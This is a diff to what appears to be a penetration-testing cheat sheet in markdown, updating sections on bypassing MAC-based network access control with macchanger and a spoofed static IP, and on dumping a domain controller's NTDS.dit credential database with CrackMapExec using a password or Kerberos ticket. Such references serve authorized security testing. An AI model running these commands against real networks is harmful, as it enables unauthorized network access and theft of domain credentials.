@@ -10,13 +10,13 @@
 
 ### NAC - MAC filtering
 
-1. Spoof mac from any authorized device \(e.g printer or voip phone\) and disconnect it: 
+1. Spoof mac, static ip, gateway ip, from any authorized device \(e.g printer or voip phone\), and disconnect it: 
 ```sh
 macchanger -r eth0
 ```
 2. force your static IP to match the one that you spoofed the mac from : 
 ```sh
-sudo ifconfig 10.11.12.13/24 && sudo ip route add default via <gateway_ip>
+sudo ifconfig <static_ip>/24 && sudo ip route add default via <gateway_ip>
 ```
 
 ### NAC - 802.1X
@@ -170,8 +170,8 @@ crackmapexec smb <host_file> -u <user> -d <domain> -H <hash> --sam
 ### Dump NDTS.dit from DC
 
 ```bash
-# CrackMapExec using hash
-sudo cme smb 192.168.1.100 -u <domain_admin> -p '<pass>' --ntds
+# CrackMapExec using password
+sudo cme smb <target> -u <domain_admin> -p '<pass>' --ntds
 
 # CrackMapExec using kerberos ticket
 export KRB5CCNAME=<user>.ccache 
